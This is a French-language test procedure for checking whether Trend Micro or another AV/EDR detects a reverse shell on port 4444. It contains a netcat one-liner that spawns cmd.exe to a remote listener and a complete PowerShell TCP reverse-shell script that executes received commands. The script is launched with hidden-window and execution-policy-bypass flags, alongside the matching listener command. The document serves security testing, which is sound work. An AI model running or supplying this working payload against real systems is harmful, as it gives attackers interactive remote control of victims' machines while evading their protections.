#############################################################
#             Reverse Shell TCP - Test AV/EDR               #
#        Test de contournement sur port arbitraire          #
#############################################################

🎯 Objectif :
Simuler une tentative de reverse shell depuis une machine Windows
(non privilégiée) vers une machine de test (listener), sur un port
non standard (ex: 4444), et observer la détection/bloquage par 
Trend Micro Deep Security ou tout autre AV/EDR.

-------------------------------------------------------------
🛠️  Pré-requis :

💻 Machine cible (Windows) :
- Accès utilisateur standard
- Powershell activé
- AV/EDR installé (ex: Trend Micro Apex One / DSA)

📡 Machine "attacker" (Kali, Parrot, Ubuntu, etc.) :
- Outils : netcat, Wireshark, etc.
- Écoute sur port arbitraire (ex: 4444)

-------------------------------------------------------------
📁 PARTIE 1 – Test avec `nc.exe` (Netcat Windows)

⚠️ La plupart des AV (Trend Micro inclus) détectent et bloquent 
`nc.exe` à l'exécution ou au moment du téléchargement.

1. Copier `nc.exe` sur la machine Windows (dans `%TEMP%`)
   Exemple : via clé USB ou serveur HTTP

2. Lancer le reverse shell :

nc.exe 10.0.0.1 4444 -e cmd.exe

⛔ Attendu :
- AV bloque l'exécution du binaire
- Ou détection comportementale de tentative de shell distant
- Journalisation dans la console Trend Micro

✅ Si bloqué ➜ Passer au test PowerShell (Partie 2)

-------------------------------------------------------------
📁 PARTIE 2 – Test avec PowerShell (recommandé)

1. Créer un fichier `revshell.ps1` dans `%TEMP%` :

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()
Exécuter le script de manière discrète :
powershell -w hidden -nop -ExecutionPolicy Bypass -File "$env:TEMP\revshell.ps1"
📌 Détails :
-w hidden : aucune fenêtre visible
-nop : évite chargement de profil
-ExecutionPolicy Bypass : contourne la politique d’exécution
Script stocké dans $env:TEMP (accessible sans admin)
📡 PARTIE 3 – Préparer la machine d’écoute
Sur la machine Kali/Linux :

Écouter sur le port choisi (ex: 4444)
nc -lvnp 4444
Une fois le reverse shell lancé depuis Windows,
tu devrais avoir un shell interactif dans ton terminal.
💬 Exemple de sortie :
Connection received on 10.0.0.5
PS C:\Users\victim\Documents>
⚠️ Si rien ne se passe :
Vérifie le firewall de la machine Windows
Vérifie l’adresse IP de ta machine d’écoute
Vérifie si l’AV a bloqué le processus
🔍 Ce que Trend Micro peut détecter :
✅ Modules potentiellement déclenchés :

Real-Time Scan : détection de fichiers ou scripts malveillants
Behavior Monitoring : détection de comportements de shell distant
Firewall Rules : blocage de ports non autorisés
Smart Protection Network : réputation du script/payload
Vision One / XDR : corrélation MITRE T1059.001, T1571
🔎 Vérifie dans la console d’administration :
Journaux → Suspicious Activity
Endpoint → Alertes liées à PowerShell ou netcat
Command line logs → contenant -nop -ExecutionPolicy ou cmd.exe
🧼 Nettoyage après test :
# Supprimer le script
Remove-Item "$env:TEMP\revshell.ps1" -Force

# Supprimer netcat si utilisé
Remove-Item "$env:TEMP\nc.exe" -Force